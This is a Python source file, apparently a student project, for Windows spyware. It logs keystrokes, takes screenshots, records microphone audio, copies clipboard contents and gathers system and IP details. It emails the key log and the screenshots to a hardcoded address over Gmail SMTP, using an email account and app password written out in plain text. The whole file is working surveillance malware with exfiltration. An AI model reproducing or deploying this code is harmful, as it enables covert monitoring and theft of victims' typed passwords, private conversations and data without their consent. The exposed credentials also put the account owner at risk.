from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process,freeze_support
from PIL import ImageGrab
keys_information="key_log.txt"
system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
microphone_time= 10
audio_information="audio.wav"
screenshot_information="screenshot.png"
email_address="nireeksha.naresh.1@gmail.com"
time_iteration=15
number_of_iteration_end = 3
password="sklylantzqrqjrty"
toaddr="nireeksha.22ad028@sode-edu.in"
file_path="C:\\Users\\Admin\\PycharmProjects\\PythonProject\\Project"
extend="\\"
def send_email(filename, attachment, toaddr):
    fromaddr =email_address
    msg = MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    msg['Subject']="Log File of Keyboard Strokes"
    body="Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment=open(attachment,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s= smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
send_email(keys_information, file_path + extend + keys_information, toaddr)
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname= socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Could not  get Public IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version()+ '\n')
        f.write("Machine: "+ platform.machine()+'\n')
        f.write("Hostname: "+ hostname+'\n')
        f.write("Private IP Address: "+IPAddr+'\n')
computer_information()
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data)

        except:
            f.write("Could not  get Clipboard Data")
copy_clipboard()
def microphone():
    fs= 44100
    seconds = microphone_time
    myrecording= sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs , myrecording)
microphone()
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()
number_of_iteration=0
currentTime=time.time()
stopping_time=time.time() + time_iteration
while number_of_iteration < number_of_iteration_end:
    count=0
    keys=[]
    def on_press(key):
        global keys, count , currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count>=1:
            count=0
            write_file(keys)
            keys=[]


    def write_file(key):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space")>0:
                    f.write('\n')

                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):

        if currentTime > stopping_time:
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    if currentTime > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        copy_clipboard()
        number_of_iteration+=1
        currentTime = time.time()
        stopping_time = time.time() + time_iteration
